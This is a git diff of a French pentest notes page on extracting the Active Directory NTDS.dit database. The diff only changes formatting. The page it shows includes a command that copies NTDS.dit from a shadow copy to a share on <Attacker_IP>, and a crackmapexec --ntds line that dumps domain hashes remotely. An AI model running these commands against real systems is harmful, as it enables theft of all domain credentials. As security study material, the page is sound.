@@ -4,7 +4,7 @@ public: true # set to true to make the article publishable
 
 ## Localement
 
-### Créer une Shadow Copy (cliché instantanné) du disque C:
+### Créer une Shadow Copy (cliché instantanné) du disque C
 
 La base NTDS.dit est par défaut stockée dans `C:\Windows\NTDS`
 
@@ -20,12 +20,13 @@ Successfully created shadow copy for 'C:\'
 ```
 
 ### Copier à partir du cliché instantanné
+
 ```
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit \\<Attacker_IP>\share\
 ```
 
-
 ## A distance
+
 ```
 crackmapexec smb $TARGET_IP -u $AD_USER -p $AD_PASSWORD --ntds
 ```
